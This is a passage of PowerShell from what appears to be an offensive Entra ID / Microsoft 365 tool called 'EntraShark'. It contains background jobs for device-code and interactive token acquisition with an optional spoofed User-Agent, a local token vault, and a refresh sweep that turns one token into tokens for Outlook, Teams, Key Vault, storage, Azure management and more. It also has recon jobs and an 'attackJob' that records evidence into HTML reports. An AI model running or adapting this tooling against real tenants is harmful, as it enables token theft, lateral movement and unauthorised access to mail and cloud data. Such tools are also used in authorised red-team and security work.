            $body = @{ client_id = $clientId; scope = $effectiveScope }
            if ($Auth.useCAE) { $body.claims = '{"access_token":{"xms_cc":{"values":["cp1"]}}}' }
        }
        $headers = @{}
        if ($Auth.customUserAgent) { $headers['User-Agent'] = [string]$Auth.customUserAgent }

        $dc = Invoke-RestMethod -Method POST -Uri $deviceUri -ContentType 'application/x-www-form-urlencoded' -Headers $headers -Body $body -ErrorAction Stop
        $verify = if ($dc.verification_uri) { $dc.verification_uri } else { $dc.verification_url }
        $Task.message = 'Waiting for user to complete device code sign-in'
        $Task.result = [ordered]@{ verificationUri = $verify; userCode = $dc.user_code; message = $dc.message; expiresIn = $dc.expires_in; clientId = $clientId; resource = $resource; outVar = $outVar; endpoint = if ($useV1) { 'v1.0' } else { 'v2.0' } }
        SaveTask $Task
        Log 'Device code ready' $Task.result

        $interval = if ($dc.interval) { [int]$dc.interval } else { 5 }
        $deadline = (Get-Date).AddSeconds([int]$dc.expires_in)
        while ((Get-Date) -lt $deadline) {
            Start-Sleep -Seconds $interval
            try {
                $tokenBody = if ($useV1) {
                    @{ grant_type = 'urn:ietf:params:oauth:grant-type:device_code'; client_id = $clientId; code = $dc.device_code }
                } else {
                    @{ grant_type = 'urn:ietf:params:oauth:grant-type:device_code'; client_id = $clientId; device_code = $dc.device_code }
                }
                $token = Invoke-RestMethod -Method POST -Uri $tokenUri -ContentType 'application/x-www-form-urlencoded' -Headers $headers -Body $tokenBody -ErrorAction Stop
                $vault = ReadVault
                $vault[$outVar] = $token
                if ($resource -match 'graph\.microsoft\.com|00000003-0000-0000-c000-000000000000') {
                    $vault['tokens'] = $token
                    $vault['graphTokens'] = $token
                }
                SaveVault $vault
                $storedAs = @($outVar)
                if ($resource -match 'graph\.microsoft\.com|00000003-0000-0000-c000-000000000000') { $storedAs += @('tokens','graphTokens') }
                $Task.state = 'completed'; $Task.completed = (Get-Date).ToString('o'); $Task.message = 'Token acquired'; $Task.result = [ordered]@{ storedAs = @($storedAs | Select-Object -Unique); clientId = $clientId; resource = $resource }
                SaveTask $Task
                Log 'Token acquired'
                return
            } catch {
                $raw = $_.ErrorDetails.Message
                $err = $null
                if ($raw) { try { $err = $raw | ConvertFrom-Json } catch {} }
                if ($err -and $err.error -eq 'authorization_pending') { Log 'Still waiting for device-code completion'; continue }
                if ($err -and $err.error -eq 'slow_down') { $interval += 5; Log 'Authorization server requested slower polling'; continue }
                throw
            }
        }
        throw 'Device code expired before sign-in completed.'
    } catch {
        $Task.state = 'failed'; $Task.completed = (Get-Date).ToString('o'); $Task.message = 'Auth failed'; $Task.error = $_.Exception.Message; SaveTask $Task; Log "Auth failed: $($_.Exception.Message)"
    }
}

$interactiveAuthJob = {
    param($Task, $ModulePath, $TokenVaultPath, $CurrentRunPath, $OutputRoot, $Auth, $ToolPath)
    Import-Module $ModulePath -Force
    function SaveTask($t) { $t | ConvertTo-Json -Depth 30 | Set-Content -LiteralPath (Join-Path $t.dir 'task.json') -Encoding UTF8 }
    function Log($msg) { [pscustomobject]@{ timestamp=(Get-Date).ToString('o'); message=$msg } | ConvertTo-Json -Compress | Add-Content -LiteralPath (Join-Path $Task.dir 'status.jsonl') -Encoding UTF8 }
    function ConvertToCellText($Value) {
        if ($null -eq $Value) { return '' }
        if ($Value -is [string] -or $Value -is [ValueType]) { return [string]$Value }
        if ($Value -is [System.Collections.IEnumerable]) {
            $items = @($Value | ForEach-Object {
                if ($null -eq $_) { '' }
                elseif ($_ -is [string] -or $_ -is [ValueType]) { [string]$_ }
                else { ($_ | ConvertTo-Json -Depth 8 -Compress) }
            } | Where-Object { $_ })
            return ($items -join '; ')
        }
        return ($Value | ConvertTo-Json -Depth 8 -Compress)
    }
    function NormalizeRowsForCsv($Rows) {
        foreach ($row in @($Rows)) {
            $out = [ordered]@{}
            foreach ($p in $row.PSObject.Properties) { $out[$p.Name] = ConvertToCellText $p.Value }
            [pscustomobject]$out
        }
    }
    function ConvertGroupWriteAccessRows($Result) {
        $rows = New-Object System.Collections.Generic.List[object]
        foreach ($section in @('Passive','Probe','Live')) {
            $items = @()
            if ($Result -and $Result.PSObject.Properties[$section]) { $items = @($Result.$section) }
            foreach ($item in $items) {
                if ($null -eq $item -or $item -is [bool]) { continue }
                $rows.Add([pscustomobject]@{
                    checkType = $section
                    groupId = $item.GroupId
                    displayName = $item.Name
                    verdict = $item.Verdict
                    reason = $item.Reason
                }) | Out-Null
            }
        }
        return @($rows.ToArray())
    }
    function WriteDatasetMarker {
        param([string]$Dataset, [string]$Reason, [string]$Detail)
        if (-not $Dataset) { return $null }
        $csv = Join-Path (Join-Path $run 'evidence') "$Dataset.csv"
        [pscustomobject]@{
            status = $Reason
            detail = $Detail
            collectedAt = (Get-Date).ToString('o')
        } | Export-Csv -LiteralPath $csv -NoTypeInformation -Encoding UTF8
        Log "Wrote dataset marker for $Dataset`: $Reason - $Detail"
        return $csv
    }
    function MergeJsonMap($Target, $Source) {
        if (-not $Source) { return }
        foreach ($p in $Source.PSObject.Properties) {
            if ($Target.PSObject.Properties[$p.Name]) {
                $Target.PSObject.Properties[$p.Name].Value = $p.Value
            } else {
                $Target | Add-Member -NotePropertyName $p.Name -NotePropertyValue $p.Value
            }
        }
    }
    function MergeRunDbFromTemp {
        param([string]$TempRun)
        $srcPath = Join-Path $TempRun 'run-db.json'
        if (-not (Test-Path -LiteralPath $srcPath)) { return }
        $dstPath = Join-Path $run 'run-db.json'
        if (-not (Test-Path -LiteralPath $dstPath)) {
            Copy-Item -LiteralPath $srcPath -Destination $dstPath -Force
            return
        }
        $dst = Get-Content -LiteralPath $dstPath -Raw | ConvertFrom-Json
        $src = Get-Content -LiteralPath $srcPath -Raw | ConvertFrom-Json
        foreach ($map in @('entitiesById','relationsByKey','directoryRoleDefinitionsById','armRoleDefinitionsById','unresolvedIds','datasets')) {
            if (-not $dst.PSObject.Properties[$map]) { $dst | Add-Member -NotePropertyName $map -NotePropertyValue ([pscustomobject]@{}) }
            if ($src.PSObject.Properties[$map]) { MergeJsonMap $dst.$map $src.$map }
        }
        $dst | ConvertTo-Json -Depth 80 | Set-Content -LiteralPath $dstPath -Encoding UTF8
    }
    function MergeFindingsFromTemp {
        param([string]$TempRun)
        $srcPath = Join-Path $TempRun 'findings.csv'
        if (-not (Test-Path -LiteralPath $srcPath)) { return }
        $dstPath = Join-Path $run 'findings.csv'
        $rows = @()
        if (Test-Path -LiteralPath $dstPath) { $rows += @(Import-Csv -LiteralPath $dstPath) }
        $rows += @(Import-Csv -LiteralPath $srcPath)
        @($rows | Group-Object id,title | ForEach-Object { $_.Group | Select-Object -Last 1 }) |
            Export-Csv -LiteralPath $dstPath -NoTypeInformation -Encoding UTF8
        Copy-Item -LiteralPath $dstPath -Destination (Join-Path (Join-Path $run 'evidence') 'findings.csv') -Force
    }
    function WriteMergedReport {
        $evidenceDir = Join-Path $run 'evidence'
        $report = Join-Path $run 'report.html'
        $tabs = @()
        if (Test-Path -LiteralPath $evidenceDir) {
            foreach ($csv in @(Get-ChildItem -LiteralPath $evidenceDir -Filter '*.csv' -File | Sort-Object Name)) {
                $rows = @(Import-Csv -LiteralPath $csv.FullName | Select-Object -First 1000)
                $tabs += [pscustomobject]@{ name=[IO.Path]::GetFileNameWithoutExtension($csv.Name); file=$csv.Name; rows=$rows }
            }
        }
        $json = ($tabs | ConvertTo-Json -Depth 50 -Compress)
        $safeJson = $json.Replace('</script', '<\/script')
        $html = @"
<!doctype html><html><head><meta charset="utf-8"><title>EntraShark Report</title>
<style>body{font-family:Segoe UI,Arial,sans-serif;margin:0;background:#f5f7fb;color:#18202a}header{background:#0c2038;color:white;padding:22px 32px}main{padding:20px}.tabs{display:flex;gap:6px;flex-wrap:wrap}.tabs button{border:1px solid #cbd5e1;background:white;border-radius:6px;padding:7px 10px}.tabs button.active{background:#0c4a75;color:white}.table-wrap{margin-top:12px;overflow:auto;max-height:760px;border:1px solid #dce3ee;background:white}table{border-collapse:collapse;width:100%;font-size:12px}th,td{border-bottom:1px solid #e5e7eb;padding:7px 9px;text-align:left;vertical-align:top;max-width:420px;overflow-wrap:anywhere}th{position:sticky;top:0;background:#f8fafc}input{padding:8px;border:1px solid #cbd5e1;border-radius:6px;width:min(560px,100%);margin-top:12px}</style></head>
<body><header><h1>EntraShark Report</h1><div>Run: $([System.Net.WebUtility]::HtmlEncode($run))</div></header><main><div id="tabs" class="tabs"></div><input id="filter" placeholder="Filter current table"><div class="table-wrap"><table id="tbl"></table></div></main>
<script id="data" type="application/json">$safeJson</script><script>
const tabs=JSON.parse(document.getElementById('data').textContent||'[]');let cur=tabs[0]?.name||'';const esc=s=>String(s??'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));function cell(v){const t=String(v??'');return /^https?:\/\//i.test(t)?'<a target="_blank" rel="noopener noreferrer" href="'+esc(t)+'">'+esc(t)+'</a>':esc(t)}function renderTabs(){const wrap=document.getElementById('tabs');wrap.innerHTML='';tabs.forEach(t=>{const b=document.createElement('button');b.className=t.name===cur?'active':'';b.textContent=t.name;b.onclick=()=>{cur=t.name;renderTabs();render()};wrap.appendChild(b)})}function render(){const data=tabs.find(t=>t.name===cur)||{rows:[]};const term=(document.getElementById('filter').value||'').toLowerCase();const rows=term?data.rows.filter(r=>JSON.stringify(r).toLowerCase().includes(term)):data.rows;const cols=[];rows.forEach(r=>Object.keys(r||{}).forEach(k=>{if(!cols.includes(k))cols.push(k)}));document.getElementById('tbl').innerHTML=cols.length?'<caption style="text-align:left;padding:8px;font-weight:600">'+esc(cur)+' - '+rows.length+' row(s)</caption><thead><tr>'+cols.map(c=>'<th>'+esc(c)+'</th>').join('')+'</tr></thead><tbody>'+rows.map(r=>'<tr>'+cols.map(c=>'<td>'+cell(r[c])+'</td>').join('')+'</tr>').join('')+'</tbody>':'<tbody><tr><td>No rows</td></tr></tbody>'}document.getElementById('filter').addEventListener('input',render);renderTabs();render();
</script></body></html>
"@
        $html | Set-Content -LiteralPath $report -Encoding UTF8
        Log "Updated merged report: $report"
    }
    function MergeTempRunArtifacts {
        param([string]$TempRun, [string]$RequestedDataset)
        $copied = 0
        $tempEvidence = Join-Path $TempRun 'evidence'
        if (Test-Path -LiteralPath $tempEvidence) {
            foreach ($csv in @(Get-ChildItem -LiteralPath $tempEvidence -Filter '*.csv' -File)) {
                Copy-Item -LiteralPath $csv.FullName -Destination (Join-Path (Join-Path $run 'evidence') $csv.Name) -Force
                $rows = @(Import-Csv -LiteralPath $csv.FullName).Count
                Log "Merged evidence $($csv.Name) ($rows row(s))"
                $copied++
            }
        }
        $tempRaw = Join-Path $TempRun 'raw'
        if (Test-Path -LiteralPath $tempRaw) {
            foreach ($raw in @(Get-ChildItem -LiteralPath $tempRaw -File)) {
                Copy-Item -LiteralPath $raw.FullName -Destination (Join-Path (Join-Path $run 'raw') $raw.Name) -Force
            }
        }
        MergeRunDbFromTemp -TempRun $TempRun
        MergeFindingsFromTemp -TempRun $TempRun
        if ($RequestedDataset) {
            $requestedCsv = Join-Path (Join-Path $run 'evidence') "$RequestedDataset.csv"
            if (-not (Test-Path -LiteralPath $requestedCsv)) {
                WriteDatasetMarker -Dataset $RequestedDataset -Reason 'not-returned' -Detail "The module completed but did not produce $RequestedDataset.csv. Check api-calls.csv for denied or empty Graph responses." | Out-Null
            }
        }
        WriteMergedReport
        return $copied
    }
    function ReadVault { if (Test-Path -LiteralPath $TokenVaultPath) { $o = Get-Content -LiteralPath $TokenVaultPath -Raw | ConvertFrom-Json; $h=[ordered]@{}; foreach($p in $o.PSObject.Properties){$h[$p.Name]=$p.Value}; $h } else { [ordered]@{} } }
    function SaveVault($vault) {
        $parent = Split-Path -Parent $TokenVaultPath
        if (-not (Test-Path -LiteralPath $parent)) { New-Item -ItemType Directory -Force -Path $parent | Out-Null }
        $vault | ConvertTo-Json -Depth 20 | Set-Content -LiteralPath $TokenVaultPath -Encoding UTF8
    }
    $Task.state='running'; $Task.started=(Get-Date).ToString('o'); $Task.message='Starting interactive auth'; SaveTask $Task
    try {
        . $ToolPath
        $outVar = if ($Auth.outVar) { [string]$Auth.outVar } else { 'consoleTokens' }
        $params = @{ Method='Interactive'; Resource=$Auth.resource; Quiet=$true; OutVar=$outVar }
        if (-not $Auth.clientIdIsDefaultOffice) {
            $params.ClientId = [string]$Auth.clientId
        } else {
            Log 'Interactive auth is using the helper default Office client so the original loopback-safe Azure CLI switch can apply.'
        }
        if ($Auth.tenantId) { $params.TenantId = [string]$Auth.tenantId }
        if ($Auth.tenant) { $params.Tenant = [string]$Auth.tenant }
        if ($Auth.scope) { $params.Scope = [string]$Auth.scope }
        if ($Auth.redirectPort) { $params.RedirectPort = [int]$Auth.redirectPort }
        if ($Auth.redirectPath) { $params.RedirectPath = [string]$Auth.redirectPath }
        if ($Auth.redirectUri) { $params.RedirectUri = [string]$Auth.redirectUri }
        if ($Auth.useV1Endpoint) { $params.UseV1Endpoint = $true }
        if ($Auth.useCAE) { $params.UseCAE = $true }
        if ($Auth.device) { $params.Device = [string]$Auth.device }
        if ($Auth.browser) { $params.Browser = [string]$Auth.browser }
        if ($Auth.customUserAgent) { $params.CustomUserAgent = [string]$Auth.customUserAgent }
        Log 'Opening browser for interactive loopback flow'
        Invoke-GetGraphTokens @params | Out-Null
        $newToken = Get-Variable -Name $outVar -Scope Global -ValueOnly -ErrorAction SilentlyContinue
        if (-not $newToken) { $newToken = $global:tokens }
        if (-not $newToken) { throw "Interactive helper did not return token variable $outVar." }
        $vault = ReadVault
        $vault[$outVar] = $newToken
        if (($Auth.resource -match 'graph|msgraph' -or -not $Auth.resource) -and $outVar -ne 'tokens') {
            $vault['tokens'] = $newToken
            $vault['graphTokens'] = $newToken
        }
        SaveVault $vault
        $storedAs = @($outVar)
        if (($Auth.resource -match 'graph|msgraph' -or -not $Auth.resource) -and $outVar -ne 'tokens') { $storedAs += @('tokens','graphTokens') }
        $Task.state='completed'; $Task.completed=(Get-Date).ToString('o'); $Task.message='Token acquired'; $Task.result=[ordered]@{ storedAs=@($storedAs | Select-Object -Unique) }; SaveTask $Task
        Log 'Token acquired'
    } catch {
        $Task.state='failed'; $Task.completed=(Get-Date).ToString('o'); $Task.message='Auth failed'; $Task.error=$_.Exception.Message; SaveTask $Task; Log "Auth failed: $($_.Exception.Message)"
    }
}

$refreshJob = {
    param($Task, $ModulePath, $TokenVaultPath, $CurrentRunPath, $OutputRoot, $Refresh, $ToolPath)
    Import-Module $ModulePath -Force
    function SaveTask($t) { $t | ConvertTo-Json -Depth 30 | Set-Content -LiteralPath (Join-Path $t.dir 'task.json') -Encoding UTF8 }
    function Log($msg) { [pscustomobject]@{ timestamp=(Get-Date).ToString('o'); message=$msg } | ConvertTo-Json -Compress | Add-Content -LiteralPath (Join-Path $Task.dir 'status.jsonl') -Encoding UTF8 }
    function AppendStreamLog($prefix, $items) {
        foreach ($item in @($items)) {
            if ($null -eq $item) { continue }
            $text = [string]$item
            if (-not $text.Trim()) { continue }
            foreach ($line in ($text -split "`r?`n")) {
                if ($line.Trim()) { Log ("$prefix$line") }
            }
        }
    }
    $script:RefreshHostBuffer = ''
    function Write-Host {
        [CmdletBinding()]
        param(
            [Parameter(Position=0, ValueFromRemainingArguments=$true)]
            [object[]]$Object,
            [object]$ForegroundColor,
            [object]$BackgroundColor,
            [switch]$NoNewline,
            [string]$Separator = ' '
        )

        $text = ($Object | ForEach-Object { [string]$_ }) -join $Separator
        if ($NoNewline) {
            $script:RefreshHostBuffer += $text
            return
        }

        $line = $script:RefreshHostBuffer + $text
        $script:RefreshHostBuffer = ''
        if ($line.Trim()) { Log $line }
    }
    function ReadVault { if (Test-Path -LiteralPath $TokenVaultPath) { $o = Get-Content -LiteralPath $TokenVaultPath -Raw | ConvertFrom-Json; $h=[ordered]@{}; foreach($p in $o.PSObject.Properties){$h[$p.Name]=$p.Value}; $h } else { [ordered]@{} } }
    function SaveVault($vault) {
        $parent = Split-Path -Parent $TokenVaultPath
        if (-not (Test-Path -LiteralPath $parent)) { New-Item -ItemType Directory -Force -Path $parent | Out-Null }
        $vault | ConvertTo-Json -Depth 20 | Set-Content -LiteralPath $TokenVaultPath -Encoding UTF8
    }
    $Task.state='running'; $Task.started=(Get-Date).ToString('o'); $Task.message='Refreshing tokens'; SaveTask $Task
    try {
        $vault = ReadVault
        $inputVar = if ($Refresh.inputVar) { [string]$Refresh.inputVar } else { 'tokens' }
        if (-not $vault.Contains($inputVar)) { throw "Source token variable $inputVar not found. Acquire or load that token first." }
        Set-Variable -Name $inputVar -Scope Global -Value $vault[$inputVar]
        . $ToolPath
        $baseParams = @{ InputVar=$inputVar; Quiet=$true }
        if ($Refresh.tenantId) { $baseParams.TenantId = [string]$Refresh.tenantId }
        if ($Refresh.clientId) { $baseParams.ClientId = [string]$Refresh.clientId }
        if ($Refresh.scope) { $baseParams.Scope = [string]$Refresh.scope }
        if ($Refresh.useV1Endpoint) { $baseParams.UseV1Endpoint = $true }
        if ($Refresh.useCAE) { $baseParams.UseCAE = $true }
        if ($Refresh.device) { $baseParams.Device = [string]$Refresh.device }
        if ($Refresh.browser) { $baseParams.Browser = [string]$Refresh.browser }
        if ($Refresh.customUserAgent) { $baseParams.CustomUserAgent = [string]$Refresh.customUserAgent }
        if ($Refresh.force) { $baseParams.Force = $true }
        if ($Refresh.mode -eq 'single') {
            $resource = if ($Refresh.resource) { $Refresh.resource } else { 'arm' }
            $outVar = if ($Refresh.outVar) { $Refresh.outVar } else { "$resource`Tokens" }
            Log "Refreshing single resource $resource into $outVar"
            $params = $baseParams.Clone()
            $params.Resource = [string]$resource
            $params.OutVar = [string]$outVar
            $resolvedResource = $resource
            $resourceKey = "$resource".ToLowerInvariant()
            if ($script:ResourceAliases.Contains($resourceKey)) { $resolvedResource = $script:ResourceAliases[$resourceKey] }
            if (-not $params.Contains('UseV1Endpoint') -and ($resolvedResource -match 'graph\.windows\.net' -or $resolvedResource -match 'management\.core\.windows\.net')) {
                $params.UseV1Endpoint = $true
                Log 'Resource requires legacy v1 OAuth endpoint; switching endpoint automatically.'
            }
            $streamOutput = @(Invoke-RefreshTokens @params *>&1)
            if ($script:RefreshHostBuffer.Trim()) { Log $script:RefreshHostBuffer; $script:RefreshHostBuffer = '' }
            AppendStreamLog '' $streamOutput
            $vault[$outVar] = Get-Variable -Name $outVar -Scope Global -ValueOnly -ErrorAction Stop
        } else {
            Log 'Running refresh sweep'
            $params = $baseParams.Clone()
            $params.Sweep = $true
            if ($Refresh.onlyAudiences) { $params.OnlyAudiences = @([string]$Refresh.onlyAudiences -split '[,\s]+' | Where-Object { $_ }) }
            if ($Refresh.skipAudiences) { $params.SkipAudiences = @([string]$Refresh.skipAudiences -split '[,\s]+' | Where-Object { $_ }) }
            $streamOutput = @(Invoke-RefreshTokens @params *>&1)
            if ($script:RefreshHostBuffer.Trim()) { Log $script:RefreshHostBuffer; $script:RefreshHostBuffer = '' }
            AppendStreamLog '' $streamOutput
            foreach ($name in @('graphTokens','aadGraphTokens','armTokens','outlookTokens','teamsTokens','officeAppsTokens','officeMgmtTokens','vaultTokens','storageTokens','powerbiTokens','flowTokens','fabricTokens','defenderTokens','intuneTokens','mamTokens','yammerTokens','sqlTokens','devopsTokens')) {
                $v = Get-Variable -Name $name -Scope Global -ValueOnly -ErrorAction SilentlyContinue
                if ($v) { $vault[$name] = $v }
            }
        }
        SaveVault $vault
        $Task.state='completed'; $Task.completed=(Get-Date).ToString('o'); $Task.message='Refresh complete'; $Task.result=[ordered]@{ tokenNames=@($vault.Keys) }; SaveTask $Task
        Log 'Refresh complete'
    } catch {
        $Task.state='failed'; $Task.completed=(Get-Date).ToString('o'); $Task.message='Refresh failed'; $Task.error=$_.Exception.Message; SaveTask $Task; Log "Refresh failed: $($_.Exception.Message)"
    }
}

$reconJob = {
    param($Task, $ModulePath, $TokenVaultPath, $CurrentRunPath, $OutputRoot, $Recon)
    Import-Module $ModulePath -Force
    function SaveTask($t) { $t | ConvertTo-Json -Depth 30 | Set-Content -LiteralPath (Join-Path $t.dir 'task.json') -Encoding UTF8 }
    function Log($msg) { [pscustomobject]@{ timestamp=(Get-Date).ToString('o'); message=$msg } | ConvertTo-Json -Compress | Add-Content -LiteralPath (Join-Path $Task.dir 'status.jsonl') -Encoding UTF8 }
    $Task.state='running'; $Task.started=(Get-Date).ToString('o'); $Task.message='Starting recon'; SaveTask $Task
    try {
        $vaultObj = Get-Content -LiteralPath $TokenVaultPath -Raw | ConvertFrom-Json
        foreach ($p in $vaultObj.PSObject.Properties) { Set-Variable -Name $p.Name -Scope Global -Value $p.Value }
        if (-not $global:tokens -and $global:graphTokens) { $global:tokens = $global:graphTokens }
        if (-not $global:tokens) { throw 'No Graph token in token vault. Acquire token first.' }
        $existingRun = if (Test-Path -LiteralPath $CurrentRunPath) { (Get-Content -LiteralPath $CurrentRunPath -Raw).Trim() } else { $null }
        if ($existingRun -and (Test-Path -LiteralPath $existingRun)) {
            $runDir = $existingRun
            Log "Updating current run directory: $runDir"
        } else {
            $runDir = Join-Path $OutputRoot ("console-" + (Get-Date -Format 'yyyyMMdd-HHmmss'))
            Log "Creating run directory: $runDir"
        }
        $statusPath = Join-Path $Task.dir 'status.jsonl'
        $tempRun = Join-Path $Task.dir 'isolated-recon'
        $params = @{ OutputDirectory=$tempRun; StatusPath=$statusPath; Quiet=$true; IncludeM365Search=[bool]$Recon.includeM365Search }
        if ($Recon.tenant) { $params.TenantId = $Recon.tenant }
        if ($Recon.modules -and @($Recon.modules).Count -gt 0) { $params.Modules = [string[]]$Recon.modules }
        $result = Invoke-EntraShark @params
        $merge = Merge-EntraSharkRunArtifactSet -TargetRun $runDir -TempRun $result.OutputDirectory
        $Task.state='completed'; $Task.completed=(Get-Date).ToString('o'); $Task.message='Recon complete'; $Task.result=[ordered]@{ outputDirectory=$runDir; tempRun=$result.OutputDirectory; findingCount=$result.Findings.Count; report=$merge.Report; modules=$result.Modules; mergedEvidenceFiles=$merge.MergedEvidenceFiles; reportTables=$merge.TableCount; reportRows=$merge.RowCount }; SaveTask $Task
        Log "Recon complete; merged $($merge.MergedEvidenceFiles) evidence operation(s) into active run and regenerated report"
    } catch {
        $Task.state='failed'; $Task.completed=(Get-Date).ToString('o'); $Task.message='Recon failed'; $Task.error=$_.Exception.Message; SaveTask $Task; Log "Recon failed: $($_.Exception.Message)"
    }
}

$attackJob = {
    param($Task, $ModulePath, $TokenVaultPath, $CurrentRunPath, $OutputRoot, $Attack, $ToolPath)
    Import-Module $ModulePath -Force
    function SaveTask($t) { $t | ConvertTo-Json -Depth 30 | Set-Content -LiteralPath (Join-Path $t.dir 'task.json') -Encoding UTF8 }
    function Log($msg) { [pscustomobject]@{ timestamp=(Get-Date).ToString('o'); message=$msg } | ConvertTo-Json -Compress | Add-Content -LiteralPath (Join-Path $Task.dir 'status.jsonl') -Encoding UTF8 }
    function BackupRunFile($Path, $Kind='evidence') {
        if (-not $Path -or -not (Test-Path -LiteralPath $Path)) { return $null }
        $stamp = Get-Date -Format 'yyyyMMdd-HHmmss-fff'
        $name = [IO.Path]::GetFileNameWithoutExtension($Path)
        $ext = [IO.Path]::GetExtension($Path)
        $history = Join-Path (Join-Path $run 'history') (Join-Path $Kind $name)
        New-Item -ItemType Directory -Force -Path $history | Out-Null
        $backup = Join-Path $history "$stamp$ext"
        Copy-Item -LiteralPath $Path -Destination $backup -Force
        return $backup
    }
    function WriteEvidenceCsv($Path, $Rows, [switch]$Append) {
        $newRows = @($Rows)
        if ($Append -and (Test-Path -LiteralPath $Path)) {
            $existing = @(Import-Csv -LiteralPath $Path)
            @($existing + $newRows) | Export-Csv -LiteralPath $Path -NoTypeInformation -Encoding UTF8
            return @($existing + $newRows).Count
        }
        if (Test-Path -LiteralPath $Path) { BackupRunFile -Path $Path -Kind 'evidence' | Out-Null }
        @($newRows) | Export-Csv -LiteralPath $Path -NoTypeInformation -Encoding UTF8
        return $newRows.Count
    }
    function WriteRawJson($Path, $Value) {
        if (Test-Path -LiteralPath $Path) { BackupRunFile -Path $Path -Kind 'raw' | Out-Null }
        $Value | ConvertTo-Json -Depth 40 | Set-Content -LiteralPath $Path -Encoding UTF8
    }
    function ConvertToCellText($Value) {
        if ($null -eq $Value) { return '' }
        if ($Value -is [string] -or $Value -is [ValueType]) { return [string]$Value }
        if ($Value -is [System.Collections.IEnumerable]) {
            $items = @($Value | ForEach-Object {
                if ($null -eq $_) { '' }
                elseif ($_ -is [string] -or $_ -is [ValueType]) { [string]$_ }
                else { ($_ | ConvertTo-Json -Depth 8 -Compress) }
            } | Where-Object { $_ })
            return ($items -join '; ')
        }
        return ($Value | ConvertTo-Json -Depth 8 -Compress)
    }
    function NormalizeRowsForCsv($Rows) {
        foreach ($row in @($Rows)) {
            $out = [ordered]@{}
            foreach ($p in $row.PSObject.Properties) { $out[$p.Name] = ConvertToCellText $p.Value }
            [pscustomobject]$out
        }
    }
    function ConvertGroupWriteAccessRows($Result) {
        $rows = New-Object System.Collections.Generic.List[object]
        foreach ($section in @('Passive','Probe','Live')) {
            $items = @()
            if ($Result -and $Result.PSObject.Properties[$section]) { $items = @($Result.$section) }
            foreach ($item in $items) {
                if ($null -eq $item -or $item -is [bool]) { continue }
                $rows.Add([pscustomobject]@{
                    checkType = $section
                    groupId = $item.GroupId
                    displayName = $item.Name
                    verdict = $item.Verdict
                    reason = $item.Reason
                }) | Out-Null
            }
        }
        return @($rows.ToArray())
    }
    function WriteDatasetMarker {
        param([string]$Dataset, [string]$Reason, [string]$Detail)
        if (-not $Dataset) { return $null }
        $csv = Join-Path (Join-Path $run 'evidence') "$Dataset.csv"
        [pscustomobject]@{
            status = $Reason
            detail = $Detail
            collectedAt = (Get-Date).ToString('o')
        } | Export-Csv -LiteralPath $csv -NoTypeInformation -Encoding UTF8
        Log "Wrote dataset marker for $Dataset`: $Reason - $Detail"
        return $csv
    }
    function MergeJsonMap($Target, $Source) {
        if (-not $Source) { return }
        foreach ($p in $Source.PSObject.Properties) {
            if ($Target.PSObject.Properties[$p.Name]) {
                $Target.PSObject.Properties[$p.Name].Value = $p.Value
            } else {
                $Target | Add-Member -NotePropertyName $p.Name -NotePropertyValue $p.Value
            }
        }
    }
    function MergeRunDbFromTemp {
        param([string]$TempRun)
        $srcPath = Join-Path $TempRun 'run-db.json'
        if (-not (Test-Path -LiteralPath $srcPath)) { return }
        $dstPath = Join-Path $run 'run-db.json'
        if (-not (Test-Path -LiteralPath $dstPath)) {
            Copy-Item -LiteralPath $srcPath -Destination $dstPath -Force
            return
        }
        $dst = Get-Content -LiteralPath $dstPath -Raw | ConvertFrom-Json
        $src = Get-Content -LiteralPath $srcPath -Raw | ConvertFrom-Json
        foreach ($map in @('entitiesById','relationsByKey','directoryRoleDefinitionsById','armRoleDefinitionsById','unresolvedIds','datasets')) {
            if (-not $dst.PSObject.Properties[$map]) { $dst | Add-Member -NotePropertyName $map -NotePropertyValue ([pscustomobject]@{}) }
            if ($src.PSObject.Properties[$map]) { MergeJsonMap $dst.$map $src.$map }
        }
        $dst | ConvertTo-Json -Depth 80 | Set-Content -LiteralPath $dstPath -Encoding UTF8
    }
    function MergeFindingsFromTemp {
        param([string]$TempRun)
        $srcPath = Join-Path $TempRun 'findings.csv'
        if (-not (Test-Path -LiteralPath $srcPath)) { return }
        $dstPath = Join-Path $run 'findings.csv'
        $rows = @()
        if (Test-Path -LiteralPath $dstPath) { $rows += @(Import-Csv -LiteralPath $dstPath) }
        $rows += @(Import-Csv -LiteralPath $srcPath)
        @($rows | Group-Object id,title | ForEach-Object { $_.Group | Select-Object -Last 1 }) |
            Export-Csv -LiteralPath $dstPath -NoTypeInformation -Encoding UTF8
        Copy-Item -LiteralPath $dstPath -Destination (Join-Path (Join-Path $run 'evidence') 'findings.csv') -Force
    }
    function WriteMergedReport {
        $evidenceDir = Join-Path $run 'evidence'
        $report = Join-Path $run 'report.html'
        $tabs = @()
        if (Test-Path -LiteralPath $evidenceDir) {
            foreach ($csv in @(Get-ChildItem -LiteralPath $evidenceDir -Filter '*.csv' -File | Sort-Object Name)) {
                $rows = @(Import-Csv -LiteralPath $csv.FullName | Select-Object -First 1000)
                $tabs += [pscustomobject]@{ name=[IO.Path]::GetFileNameWithoutExtension($csv.Name); file=$csv.Name; rows=$rows }
            }
        }
        $json = ($tabs | ConvertTo-Json -Depth 50 -Compress)
        $safeJson = [System.Net.WebUtility]::HtmlEncode($json)
        $html = @"
<!doctype html><html><head><meta charset="utf-8"><title>EntraShark Report</title>
<style>body{font-family:Segoe UI,Arial,sans-serif;margin:0;background:#f5f7fb;color:#18202a}header{background:#0c2038;color:white;padding:22px 32px}main{padding:20px}.tabs{display:flex;gap:6px;flex-wrap:wrap}.tabs button{border:1px solid #cbd5e1;background:white;border-radius:6px;padding:7px 10px}.tabs button.active{background:#0c4a75;color:white}.table-wrap{margin-top:12px;overflow:auto;max-height:760px;border:1px solid #dce3ee;background:white}table{border-collapse:collapse;width:100%;font-size:12px}th,td{border-bottom:1px solid #e5e7eb;padding:7px 9px;text-align:left;vertical-align:top;max-width:420px;overflow-wrap:anywhere}th{position:sticky;top:0;background:#f8fafc}input{padding:8px;border:1px solid #cbd5e1;border-radius:6px;width:min(560px,100%);margin-top:12px}</style></head>
<body><header><h1>EntraShark Report</h1><div>Run: $([System.Net.WebUtility]::HtmlEncode($run))</div></header><main><div id="tabs" class="tabs"></div><input id="filter" placeholder="Filter current table"><div class="table-wrap"><table id="tbl"></table></div></main>
<script id="data" type="application/json">$safeJson</script><script>
